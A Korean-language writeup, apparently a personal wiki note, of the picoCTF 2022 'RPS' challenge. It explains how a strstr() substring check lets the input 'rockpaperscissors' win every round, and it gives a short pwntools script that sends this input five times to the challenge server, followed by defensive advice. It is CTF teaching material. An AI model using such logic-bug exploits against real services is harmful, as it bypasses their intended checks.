---
title: RPS — picoCTF 2022 pwn writeup
created: 2026-06-15
updated: 2026-06-21
type: query
tags: [ctf, pwn, logic-bug, strstr, prng, picoctf]
sources: [https://ctftime.org/writeup/33269, https://cryptocat.me/blog/ctf/2022/pico/pwn/rps/, https://hhyleung.github.io/writeups/picoctf-2022-binary/]
confidence: high
---

# RPS — picoCTF 2022 pwn writeup

> `RPS`는 **Rock/Paper/Scissors 게임 로직에서 `strstr()`와 `rand()`를 함께 사용해 승리 조건을 속이는 picoCTF 2022 Binary Exploitation 문제**입니다. 핵심은 **메모리 손상이 아니라 로직 결함**입니다.

## 참고 URL
- [CTFtime writeup](https://ctftime.org/writeup/33269)
- [cryptocat.me](https://cryptocat.me/blog/ctf/2022/pico/pwn/rps/)
- [hhyleung.github.io](https://hhyleung.github.io/writeups/picoctf-2022-binary/)


## 1. 핵심 요약

- 프로그램은 5번 이기면 flag를 줍니다.
- 컴퓨터의 수는 `rand() % 3`로 정합니다.
- 승리 여부는 `strstr(player_turn, loses[computer_turn])`로 판단합니다.
- 따라서 입력 문자열 안에 `paper`, `scissors`, `rock`를 모두 포함시키면 어떤 결과가 나와도 승리 조건을 만족시킬 수 있습니다.

## 2. 문제 구조

| 항목 | 내용 |
|------|------|
| 플랫폼 | picoCTF 2022 |
| 분류 | pwn / logic bug |
| 핵심 요소 | `strstr()`, `rand()`, 승리 조건 우회 |
| 공격 방식 | 입력 문자열 조작 |
| 목표 | 5연승 후 flag 획득 |

## 3. 공격 흐름

1. 프로그램이 입력을 받아 RPS 한 판을 진행합니다.
2. 컴퓨터 수는 난수이지만, 승리 판정은 `strstr()` 기반입니다.
3. 입력 문자열에 모든 선택지를 포함시키면 됩니다.
4. 예: `rockpaperscissors`
5. 이를 5번 반복하면 flag가 출력됩니다.

## 4. 왜 가능한가

`strstr(a, b)`는 `a` 안에 `b`가 부분 문자열로 존재하면 포인터를 반환합니다. 이 문제는 “정확히 같은 값인지”가 아니라 “포함되는지”만 확인합니다.

```c
// 개념 예시입니다.
if (strstr(player_turn, loses[computer_turn])) {
    // 승리
}
```

이 때문에 사용자는 컴퓨터가 어떤 수를 내더라도, 그 수를 포함하는 상위 문자열을 입력하면 승리 판정을 통과합니다.

## 5. 익스플로잇 예시

```python
from pwn import *  # pwntools를 불러옵니다.

io = remote('saturn.picoctf.net', 53865)  # 원격 서비스에 연결합니다.

for _ in range(5):
    io.recvuntil(b'program')          # 게임 메뉴가 나올 때까지 기다립니다.
    io.sendline(b'1')                 # 게임 시작을 선택합니다.
    io.recvuntil(b':')                # 입력 프롬프트를 기다립니다.
    io.sendline(b'rockpaperscissors') # 모든 선택지를 포함한 문자열을 보냅니다.

io.interactive()  # flag 출력 이후 상호작용합니다.
```


## 재현 절차

1. 게임 입력과 승리 조건을 확인합니다.
```bash
# 프로그램의 입력 형식을 먼저 확인합니다.
./vuln                   # 예상: rock / paper / scissors 선택 프롬프트가 출력됩니다.
```
2. 문자열 비교 로직을 우회하는 입력을 준비합니다.
```python
# substring 비교에 맞는 입력 후보를 점검합니다.
choices = [b"rock", b"paper", b"scissors"]
for c in choices:
    print(c.decode())     # 예상: 각각의 후보 문자열이 출력됩니다.
```
3. 조건을 만족하는 응답을 보내 flag가 나오는지 확인합니다.
## 6. 방어 관점 메모

- 승리 판정은 부분 문자열이 아니라 **정확한 값 비교**로 해야 합니다.
- `rand()` 기반 로직은 예측 가능성이 있으므로 보안 판단에 사용하면 안 됩니다.
- 게임형 문제는 입력 검증보다 **판정 함수의 의미**가 더 중요합니다.

## 7. 비교 포인트

- `ROPfu`는 **classic ROP형 pwn**입니다.
- `Function Overwrite`는 **function pointer overwrite형 pwn**입니다.
- `RPS`는 **logic bug / substring match abuse형 pwn**입니다.
- `Flag Leak`은 **정보 유출형 pwn**입니다.

## 8. 참고 자료

- [CTFtime — picoCTF 2022 / RPS / Writeup](https://ctftime.org/writeup/33269)
- [CryptoCat — PRNG Prediction to Beat Rock Paper Scissors | PicoCTF 2022: RPS](https://cryptocat.me/blog/ctf/2022/pico/pwn/rps/)
- [[substring-logic-bug-ctf-patterns]]
- [[exploitation]]
